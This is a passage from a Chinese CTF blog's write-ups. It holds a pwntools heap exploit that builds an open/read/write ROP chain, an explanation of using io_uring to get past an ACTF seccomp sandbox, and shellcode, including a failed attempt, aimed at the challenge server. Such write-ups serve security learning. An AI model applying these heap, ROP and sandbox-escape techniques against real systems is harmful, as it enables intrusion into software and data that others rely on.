class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">14</span>,p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]) + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]+<span class="hljs-number">8</span>))<br><br>stack = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret_addr = stack - <span class="hljs-number">0x138</span> - <span class="hljs-number">0x60</span><br><br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">14</span>,p64(ret_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>])<br><br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br><br>pop_rdi = <span class="hljs-number">0x000000000002a3e5</span> + libc.address<br>pop_rsi = <span class="hljs-number">0x0000000000160498</span> + libc.address<br>pop_rdx = <span class="hljs-number">0x00000000000796a2</span> + libc.address<br>lea_ret = <span class="hljs-number">0x000000000004da83</span> + libc.address<br>orw = flat([<br>    pop_rdi,ret_addr,<br>    pop_rsi,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">3</span>,<br>    pop_rsi,heap_base+<span class="hljs-number">0x300</span>,<br>    pop_rdx,<span class="hljs-number">0x40</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi,<span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],<br>])<br>edit(<span class="hljs-number">0</span>,orw)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(lea_ret) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(heap_base+<span class="hljs-number">0x7a0</span>-<span class="hljs-number">8</span>) + p64(lea_ret))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF</title>
    <link href="/2023/10/31/ACTF/"/>
    <url>/2023/10/31/ACTF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>👴有罪</p><p>👴这次爆零了</p><p>回想几个月前remakeACTF2022，唯一一道remake出来的tree_pwn还是看Nameless👴的博客搓的。</p><p>不得不感叹AAA的师傅出题是真有水平，没有奇怪的脑洞，全是干货。</p><p>但这和我一道都做不出有什么关系呢，悲</p><p>😭😭😭😭😭</p><p>没有能力的人是只能赛后remake的，是没有资格享受解题的激动与喜悦的</p><p>哎，屑korey这篇remake会写的尽量详细。</p><p>真的要得玉玉症了呜呜呜</p><h1 id="0x1：Pwn-remake🤣"><a href="#0x1：Pwn-remake🤣" class="headerlink" title="0x1：Pwn remake🤣"></a>0x1：Pwn remake🤣</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>你是master🐎，反正👴不是</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>能直接执行输入的shellcode，但是，我要说但是，本题开了一个及其离谱的沙盒：</p><p><img src="/img/ACTF/0.png" alt="img"></p><p>把<code>open read write</code>及其替代品是全kill了</p><p>👴当时想的是<code>clone、fork、ptrace、lseek</code>这些都没禁，想用<code>ptrace</code>来着，后来仔细一想我真tm是个SB啊，无论是<code>fork</code>还是<code>clone</code>，创建那个新进程时sandbox已经被调用了。</p><p>然后就没有然后了，👴又想找找有没有<code>open read</code>的漏网之鱼，打个测信道，然后也没有了下文。</p><p>👴开摆了，反正👴不是master就不是吧（bushi）</p><p>比赛结束后，Nightu👴说这题一眼看出<code>io_uring</code></p><p>PS：👴当时的反应：这又是哪个🐔8玩意，怎么人与人的差别比人与狗的都大，妈妈生的</p><p>然后👴就去找资料了解<code>io_uring</code>了</p><h3 id="What-‘s-io-uring"><a href="#What-‘s-io-uring" class="headerlink" title="What ‘s io_uring"></a>What ‘s io_uring</h3><p><code>io_uring</code>是<code>linux</code>从内核版本5.1开始引入的高性能异步I&#x2F;O框架</p><p>具体的可以看<a href="https://arthurchiao.art/blog/intro-to-io-uring-zh/#25-io_uring-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-api">这个</a></p><p>这边主要说一下和题目相关的</p><p>因为👴一直用CSDN上的祖传调用表，对于这三个调用号在400多的 👴是真的没印象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">三个系统调用<br>io_uring_setup<br>io_uring_register<br>io_uring_enter<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/1.png" alt="img"></p><p>其中<code>io_uring_setup</code> + <code>io_uring_enter</code>就可以完成绝大部分I&#x2F;O操作。</p><h4 id="io-uring-setup"><a href="#io-uring-setup" class="headerlink" title="io_uring_setup"></a>io_uring_setup</h4><p>先用<code>io_uring_setup</code>设置异步I&#x2F;O操作的上下文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_setup</span><span class="hljs-params">(u32 entries, <span class="hljs-keyword">struct</span> io_uring_params *p)</span>;<br></code></pre></td></tr></table></figure><ul><li>创建一个 SQ(<code>submission queu</code>e, 提交队列) 和一个 CQ(<code>completed queue</code>,完成队列）</li><li><code>queue size</code> 至少 <code>entries</code> 个元素，</li><li>返回一个文件描述符，随后用于在这个 <code>io_uring</code> 实例上执行操作。</li></ul><p>SQ 和 CQ 在应用和内核之间共享，避免了在初始化和完成 I&#x2F;O 时<code>（initiating and completing I/O）</code>拷贝数据。</p><p>参数 p：</p><ul><li>应用用来配置 <code>io_uring</code>，</li><li>内核返回的 SQ&#x2F;CQ 配置信息也通过它带回来。</li></ul><p><code>io_uring_setup()</code> 成功时返回一个文件描述符<code>（fd）</code>。</p><p>应用随后可以将这个 fd 传给 <code>mmap(2)</code> 系统调用，来 <code>map the submission and completion queues</code> 或者传给 <code>to the io_uring_register() or io_uring_enter() system calls</code>.</p><h4 id="io-uring-enter"><a href="#io-uring-enter" class="headerlink" title="io_uring_enter"></a>io_uring_enter</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_enter</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> to_submit, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> min_complete, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">sigset_t</span> *sig)</span>;<br></code></pre></td></tr></table></figure><p>这个系统调用用于初始化和完成<code>（initiate and complete）</code>I&#x2F;O，使用共享的 SQ 和 CQ。 单次调用同时执行：</p><ol><li>提交新的 I&#x2F;O 请求</li><li>等待 I&#x2F;O 完成</li></ol><p>参数：</p><ol><li><code>fd</code> 是 <code>io_uring_setup()</code> 返回的文件描述符；</li><li><code>to_submit</code> 指定了 SQ 中提交的 I&#x2F;O 数量；</li></ol><p><code>io_uring_enter()</code> 支持很多操作，包括：</p><ul><li>Open, close, and stat files</li><li>Read and write into multiple buffers or pre-mapped buffers</li><li>Socket I&#x2F;O operations</li><li>Synchronize file state</li><li>Asynchronously monitor a set of file descriptors</li><li>Create a timeout linked to a specific operation in the ring</li><li>Attempt to cancel an operation that is currently in flight</li><li>Create I&#x2F;O chains</li><li>Ordered execution within a chain</li><li>Parallel execution of multiple chains</li></ul><p>具体的demo可以让chatgpt帮忙写一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// 初始化参数</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// 配置open操作</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// 提交open操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 配置read操作</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">4</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交read操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交write操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// 等待操作完成</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// 提交所有操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 清理</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后可以进GDB看看发生了什么</p><p>可以看到<code>io_uring_queue_init_params</code>实际是<code>io_uring_setup</code>和两个<code>mmap</code>的封装</p><p><code>io_uring_setup</code>执行后返回fd &#x3D; 3</p><p><img src="/img/ACTF/2.png" alt="img"></p><p>两个<code>mmap</code>有所不同，这个等会再讲</p><p><img src="/img/ACTF/3.png" alt="img"></p><p><img src="/img/ACTF/4.png" alt="img"></p><p>设第一个mmap出来的内存地址为<code>mmap_address1</code>，第二个mmap出来的内存地址为<code>mmap_address2</code></p><p><code>io_uring_prep_openat</code>和<code>io_uring_sqe_set_flags</code>实则在对<code>mmap_address2</code>处的sqe结构体进行设置</p><p>后面的<code>io_uring_prep_read/write</code>也是如此</p><p>翻看源码，sqe结构体具体是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> &#123;</span><br>__u8opcode;<span class="hljs-comment">/* type of operation for this sqe */</span><br>__u8flags;<span class="hljs-comment">/* IOSQE_ flags */</span><br>__u16ioprio;<span class="hljs-comment">/* ioprio for the request */</span><br>__s32fd;<span class="hljs-comment">/* file descriptor to do IO on */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64off;<span class="hljs-comment">/* offset into file */</span><br>__u64addr2;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32cmd_op;<br>__u32__pad1;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64addr;<span class="hljs-comment">/* pointer to buffer or iovecs */</span><br>__u64splice_off_in;<br>&#125;;<br>__u32len;<span class="hljs-comment">/* buffer size or number of iovecs */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">__kernel_rwf_t</span>rw_flags;<br>__u32fsync_flags;<br>__u16poll_events;<span class="hljs-comment">/* compatibility */</span><br>__u32poll32_events;<span class="hljs-comment">/* word-reversed for BE */</span><br>__u32sync_range_flags;<br>__u32msg_flags;<br>__u32timeout_flags;<br>__u32accept_flags;<br>__u32cancel_flags;<br>__u32open_flags;<br>__u32statx_flags;<br>__u32fadvise_advice;<br>__u32splice_flags;<br>__u32rename_flags;<br>__u32unlink_flags;<br>__u32hardlink_flags;<br>__u32xattr_flags;<br>__u32msg_ring_flags;<br>__u32uring_cmd_flags;<br>&#125;;<br>__u64user_data;<span class="hljs-comment">/* data to be passed back at completion time */</span><br><span class="hljs-comment">/* pack this to avoid bogus arm OABI complaints */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* index into fixed buffers, if used */</span><br>__u16buf_index;<br><span class="hljs-comment">/* for grouped buffer selection */</span><br>__u16buf_group;<br>&#125; __attribute__((packed));<br><span class="hljs-comment">/* personality to use, if used */</span><br>__u16personality;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__s32splice_fd_in;<br>__u32file_index;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16addr_len;<br>__u16__pad3[<span class="hljs-number">1</span>];<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u64addr3;<br>__u64__pad2[<span class="hljs-number">1</span>];<br>&#125;;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span><br><span class="hljs-comment"> * this field is used for 80 bytes of arbitrary command data</span><br><span class="hljs-comment"> */</span><br>__u8cmd[<span class="hljs-number">0</span>];<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在程序中leak这个结构体康康</p><p><img src="/img/ACTF/5.png" alt="img"></p><p>发现是吻合的</p><p>至于<code>io_uring_submit</code>，则是<code>io_uring_enter</code>的封装</p><p><img src="/img/ACTF/6.png" alt="img"></p><p>OK，Poc分析完毕</p><h3 id="试图手搓shellcode"><a href="#试图手搓shellcode" class="headerlink" title="试图手搓shellcode"></a>试图手搓shellcode</h3><p>笔者觉得总的流程就是<code>syscall_io_uring_setup</code>初始化上下文，两个<code>syscall_mmap</code>，设置好sqe结构体后<code>syscall_io_uring_enter</code>提交<code>submisson</code>。</p><p>But，笔者怎么搓都打不通呜呜呜&#x2F;(ㄒoㄒ)&#x2F;~~</p><p>这边放上笔者的失败品，如果有master搓通了能不能教教弟弟呜呜。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>code1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov rsi, rdx</span><br><span class="hljs-string">        add rsi, 0x500</span><br><span class="hljs-string">        mov rdi, 0x10</span><br><span class="hljs-string">        push 425</span><br><span class="hljs-string">        pop rax</span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>code2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov byte ptr [rax], 0x12</span><br><span class="hljs-string">        mov dword ptr [rax+4], 0xffffff9c</span><br><span class="hljs-string">        mov r15, 0x67616c662f2e</span><br><span class="hljs-string">        push r15</span><br><span class="hljs-string">        mov qword ptr [rax+0x10], rsp</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x40], 0x16</span><br><span class="hljs-string">        mov dword ptr [rax+0x44], 4</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x50], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x58], 0x30</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x80], 0x17</span><br><span class="hljs-string">        mov dword ptr [rax+0x84], 1</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x90], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x98], 0x30</span><br><span class="hljs-string">        mov rcx, 3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = asm(code1, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0</span>)) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x10000000</span>)) + \<br>            asm(code2, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.io_uring_enter(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>))<br><br>gdb.attach(p)<br>sl(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>能初始化但是任务提交不上去呜呜</p><h3 id="recvfrom！！"><a href="#recvfrom！！" class="headerlink" title="recvfrom！！"></a>recvfrom！！</h3><p>看了好几个师傅的wp发现都是用<code>recvfrom</code>做的，因为<code>socket、connect、recvfrom</code>都活着</p><p>先用gpt写一个poc，关掉pie，静态编译，建议加上-O3优化</p><p>用<code>mmap</code>把0x400000那边权限改了，建立socket连接后，把静态链接的程序读入0x400000处</p><p>最后jmp到传入进去的<code>main</code>函数</p><p>真tm妙啊，妈妈生的</p><p>Poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> 